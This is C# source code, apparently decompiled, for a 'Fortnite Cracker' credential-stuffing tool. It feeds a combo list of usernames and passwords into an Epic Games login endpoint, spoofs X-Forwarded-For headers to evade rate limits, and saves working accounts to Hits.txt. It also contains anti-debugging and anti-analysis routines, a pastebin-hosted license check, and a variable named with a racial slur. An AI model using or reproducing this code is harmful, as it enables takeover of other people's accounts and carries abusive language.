using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace kappa
{
	internal static class Module1
	{
		private static string combo;

		private static string proxies;

		private static Queue<string> comboQueue;

		private static Queue<string> proxyQueue;

		private static Queue<string> goodProxies;

		public static System.Random Random;

		private static List<string> niggers;

		private static int threads;

		private static CookieContainer logincookie;

		private static int good;

		private static int bad;

		private static int retries;

		private static int ratelimit;

		private static int @checked;

		private static string region;

		private static int cpm;

		private static int cpm2;

		private static List<string> multilist;

		private static string writelines;

		private static int dupelist;

		private static string removedupes;

		private static int checkeddupes;

		private static int loadedcombos;

		private static string tempthread;

		public static bool Authed;

		static Module1()
		{
			Module1.combo = "combo.txt";
			Module1.proxies = "proxies.txt";
			Module1.comboQueue = new Queue<string>();
			Module1.proxyQueue = new Queue<string>();
			Module1.goodProxies = new Queue<string>();
			int tickCount = Environment.TickCount;
			DateTime now = DateTime.Now;
			Module1.Random = new System.Random(tickCount ^ now.Millisecond);
			Module1.niggers = new List<string>();
			Module1.multilist = new List<string>();
			Module1.loadedcombos = File.ReadLines(Module1.combo).Count<string>();
		}

		private static void AntiDebug()
		{
			string[] strArrays = new string[] { "codecracker", "x32dbg", "x64dbg", "ida -", "charles", "dnspy", "simpleassembly", "peek", "httpanalyzer", "httpdebug", "fiddler", "wireshark" };
			while (true)
			{
				if ((Debugger.IsAttached || Debugger.IsLogging() ? true : Module1.MEMORYBASICINFORMATION()))
				{
					Environment.Exit(0);
				}
				Process[] processes = Process.GetProcesses();
				for (int i = 0; i < (int)processes.Length; i++)
				{
					Process process = processes[i];
					if (process != Process.GetCurrentProcess())
					{
						for (int j = 0; j < (int)strArrays.Length; j++)
						{
							int id = Process.GetCurrentProcess().Id;
							if (process.ProcessName.ToLower().Contains(strArrays[j]))
							{
								Console.WriteLine(string.Concat(new object[] { "START CMD /C \"ECHO Debugger program detected ! (HResult 0x04)", process.ProcessName, " : {", j, "} && PAUSE\" " }));
								File.WriteAllText("Exit.txt", string.Format("Please close {0}", process.ProcessName));
								Process.GetCurrentProcess().Kill();
							}
							if (process.MainWindowTitle.ToLower().Contains(strArrays[j]))
							{
								Console.WriteLine(string.Concat(new object[] { "START CMD /C \"ECHO Debugger program detected ! (HResult 0x04)", process.ProcessName, " : {", j, "} && PAUSE\" " }));
								File.WriteAllText("Exit.txt", string.Format("Please close {0}", process.ProcessName));
								Process.GetCurrentProcess().Kill();
							}
						}
					}
				}
				Thread.Sleep(1000);
			}
		}

		public static void check()
		{
			WebResponse response;
			while (true)
			{
				Console.Title = string.Concat(new object[] { "Proxyless Fortnite Cracker By Kekd | Hits: ", Module1.good, " | Checked: ", Module1.@checked, " | Remaining: ", Module1.comboQueue.Count, " | CPM: ", Module1.cpm2 * 60 });
				if (Module1.comboQueue.Count == 0)
				{
					break;
				}
				try
				{
					string str = Module1.comboQueue.Dequeue();
					try
					{
						char[] chrArray = new char[] { ':', default(char), default(char), default(char) };
						string[] strArrays = str.Split(new char[] { chrArray[0] });
						string str1 = strArrays[0];
						string str2 = strArrays[1];
						string str3 = string.Concat(new string[] { "grant_type=password&username=", str1, "&password=", str2, "&includePerms=true&token_type=eg1" });
						CookieContainer cookieContainer = new CookieContainer();
						byte[] bytes = (new UTF8Encoding()).GetBytes(str3);
						HttpWebRequest length = (HttpWebRequest)WebRequest.Create("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token");
						length.Method = "POST";
						length.KeepAlive = true;
						length.CookieContainer = cookieContainer;
						length.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
						byte[] numArray = new byte[4];
						Module1.Random.NextBytes(numArray);
						length.ServicePoint.ConnectionLimit = 9999999;
						length.Headers.Add("X-Forwarded-For", (new IPAddress(numArray)).ToString());
						length.Headers.Set(HttpRequestHeader.Authorization, "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=");
						length.Timeout = 5000;
						length.Accept = "*/*";
						length.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0";
						length.ContentLength = (long)((int)bytes.Length);
						Stream requestStream = length.GetRequestStream();
						requestStream.Write(bytes, 0, (int)bytes.Length);
						requestStream.Close();
						try
						{
							response = (HttpWebResponse)length.GetResponse();
							Module1.logincookie = cookieContainer;
							StreamReader streamReader = new StreamReader(response.GetResponseStream());
							string end = streamReader.ReadToEnd();
							streamReader.Close();
							response.Close();
							if (end.Contains("access_token"))
							{
								Console.ForegroundColor = ConsoleColor.Green;
								char chr = '√';
								Console.WriteLine(string.Concat("[", chr.ToString(), "]", str));
								Module1.@checked++;
								Module1.good++;
								Module1.cpm++;
								TextWriter streamWriter = new StreamWriter("Hits.txt", true);
								streamWriter.WriteLine(str);
								streamWriter.Close();
							}
						}
						catch (WebException webException)
						{
							response = webException.Response;
							StreamReader streamReader1 = new StreamReader(response.GetResponseStream());
							string end1 = streamReader1.ReadToEnd();
							streamReader1.Close();
							response.Close();
							if (end1.Contains("Sorry the account credentials you are using are invalid"))
							{
								if (Module1.writelines == "y")
								{
									streamReader1.Close();
									response.Close();
									Console.ForegroundColor = ConsoleColor.Red;
									Console.WriteLine(string.Concat("[x]", str));
								}
								Module1.@checked++;
								Module1.bad++;
								Module1.cpm++;
								goto Label0;
							}
							else if (!Module1.comboQueue.Contains(str))
							{
								Module1.comboQueue.Enqueue(str);
							}
						}
					}
					catch (Exception exception)
					{
						if (!Module1.comboQueue.Contains(str))
						{
							Module1.comboQueue.Enqueue(str);
						}
					}
				}
				catch (Exception exception1)
				{
				}
			Label0:
			}
			Module1.threads--;
		}

		private static void DefaultDependencyAttribute()
		{
			string str = "COR";
			if ((Environment.GetEnvironmentVariable(string.Concat(str, "_PROFILER")) != null ? true : Environment.GetEnvironmentVariable(string.Concat(str, "_ENABLE_PROFILING")) != null))
			{
				Environment.FailFast(null);
			}
			(new Thread(new ThreadStart(Module1.AntiDebug))).Start();
		}

		private static void LoadAuth()
		{
			string str;
			try
			{
				str = "";
				WebClient webClient = new WebClient();
				webClient.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
				webClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
				webClient.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US,en;q=0.9");
				string str1 = webClient.DownloadString("https://pastebin.com/raw/bFeKSDsk");
				webClient.Dispose();
				if (!File.Exists("license.txt"))
				{
					File.Create("license.txt");
				}
				else if (!string.IsNullOrEmpty(File.ReadAllText("license.txt")))
				{
					goto Label1;
				}
				Console.WriteLine("License key?");
				str = Console.ReadLine();
			Label0:
				if (string.IsNullOrEmpty(str))
				{
					Console.WriteLine("License key is empty.");
					Console.ReadKey();
					Environment.Exit(0);
				}
				string str2 = Module1.MD5Hash((new HWID()).HWIDToStr());
				string str3 = "";
				string[] strArrays = str1.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
				for (int i = 0; i < (int)strArrays.Length; i++)
				{
					string str4 = strArrays[i];
					string str5 = str4.Split(new char[] { ':' })[0];
					string str6 = str4.Split(new char[] { ':' })[1];
					if ((str == str5 ? false : str2 != str6))
					{
						Module1.Authed = false;
					}
					else if ((str5 != str ? false : str2 != str6))
					{
						str3 = "false";
					}
					else if ((str5 != str ? false : str2 == str6))
					{
						Module1.Authed = true;
						break;
					}
				}
				if (str3 == "false")
				{
					Console.WriteLine("Wrong HWID!");
					Console.WriteLine("Contact me on my discord \"OrmJävel#7000\" to reset your HWID");
					Console.WriteLine("HWID Copied to clipboard");
					Clipboard.SetText(str2);
					Console.ReadKey();
					Environment.Exit(0);
				}
				else if (Module1.Authed)
				{
					Console.WriteLine("Authed!");
					if (string.IsNullOrEmpty(File.ReadAllText("license.txt")))
					{
						File.AppendAllText("license.txt", str);
					}
				}
				else if (!Module1.Authed)
				{
					Console.WriteLine("Invalid license key!");
					Console.ReadKey();
					Environment.Exit(0);
				}
			}
			catch (Exception exception)
			{
				Console.WriteLine("Unable to connect!");
				Console.ReadKey();
				Environment.Exit(0);
			}
			return;
		Label1:
			str = File.ReadAllText("license.txt");
			goto Label0;
		}

		[STAThread]
		public static void Main()
		{
			string str = "  _____                          _                   ______            _           _  _        \r\n |  __ \\                        | |                 |  ____|          | |         (_)| |       \r\n | |__) |_ __  ___ __  __ _   _ | |  ___  ___  ___  | |__  ___   _ __ | |_  _ __   _ | |_  ___ \r\n |  ___/| '__|/ _ \\\\ \\/ /| | | || | / _ \\/ __|/ __| |  __|/ _ \\ | '__|| __|| '_ \\ | || __|/ _ \\\r\n | |    | |  | (_) |>  < | |_| || ||  __/\\__ \\\\__ \\ | |  | (_) || |   | |_ | | | || || |_|  __/\r\n |_|    |_|   \\___//_/\\_\\ \\__, ||_| \\___||___/|___/ |_|   \\___/ |_|    \\__||_| |_||_| \\__|\\___|\r\n                           __/ |                                                               \r\n                          |___/                                                                \r\n   _____                    _                 ____           _  __      _        _             \r\n  / ____|                  | |               |  _ \\         | |/ /     | |      | |            \r\n | |      _ __  __ _   ___ | | __ ___  _ __  | |_) | _   _  | ' /  ___ | | __ __| |            \r\n | |     | '__|/ _` | / __|| |/ // _ \\| '__| |  _ < | | | | |  <  / _ \\| |/ // _` |            \r\n | |____ | |  | (_| || (__ |   <|  __/| |    | |_) || |_| | | . \\|  __/|   <| (_| |            \r\n  \\_____||_|   \\__,_| \\___||_|\\_\\\\___||_|    |____/  \\__, | |_|\\_\\\\___||_|\\_\\\\__,_|            \r\n                                                      __/ |                                    \r\n                                                     |___/                                     ";
			Console.ForegroundColor = ConsoleColor.Red;
			Console.WriteLine(str);
			Console.ForegroundColor = ConsoleColor.White;
			foreach (string str1 in File.ReadLines(Module1.combo))
			{
				Module1.comboQueue.Enqueue(str1);
			}
			Console.Clear();
			Console.WriteLine(string.Concat("Loaded ", Module1.comboQueue.Count, " Combos"));
			Console.ForegroundColor = ConsoleColor.Red;
			Console.WriteLine(str);
			Console.WriteLine("");
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("Write invalid lines? y/n");
			Module1.writelines = Console.ReadLine();
			if (Module1.writelines != "y")
			{
				if (Module1.writelines != "n")
				{
					Console.WriteLine("Enter y / n");
					Console.ReadKey();
					Environment.Exit(0);
				}
			}
			Console.Clear();
			Console.ForegroundColor = ConsoleColor.Red;
			Console.WriteLine(str);
			Console.WriteLine("");
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("Enter ammount of threads: ");
			Module1.threads = Convert.ToInt32(Console.ReadLine());
			Console.Clear();
			for (int i = 1; i <= Module1.threads; i++)
			{
				(new Thread(new ThreadStart(Module1.check))).Start();
			}
			System.Timers.Timer timer = new System.Timers.Timer(1000)
			{
				AutoReset = true
			};
			timer.Elapsed += new ElapsedEventHandler(Module1.t_Elapsed);
			timer.Start();
			while (true)
			{
				if (Module1.threads == 0)
				{
					Console.WriteLine("Done!");
					Console.ReadKey();
				}
			}
		}

		public static string MD5Hash(string input)
		{
			StringBuilder stringBuilder = new StringBuilder();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] numArray = mD5CryptoServiceProvider.ComputeHash((new UTF8Encoding()).GetBytes(input));
			for (int i = 0; i < (int)numArray.Length; i++)
			{
				stringBuilder.Append(numArray[i].ToString("x2"));
			}
			return stringBuilder.ToString();
		}

		private static bool MEMORYBASICINFORMATION()
		{
			bool flag = false;
			IEnumerator enumerator = Process.GetCurrentProcess().Modules.GetEnumerator();
			while (enumerator.MoveNext())
			{
				if (((ProcessModule)enumerator.Current).ModuleName.EndsWith(".ni.dll"))
				{
					flag |= 1;
				}
			}
			return Debugger.IsAttached | !flag;
		}

		[STAThread]
		private static void t_Elapsed(object sender, ElapsedEventArgs e)
		{
			Module1.cpm2 = Module1.cpm;
			Module1.cpm = 0;
		}
	}
}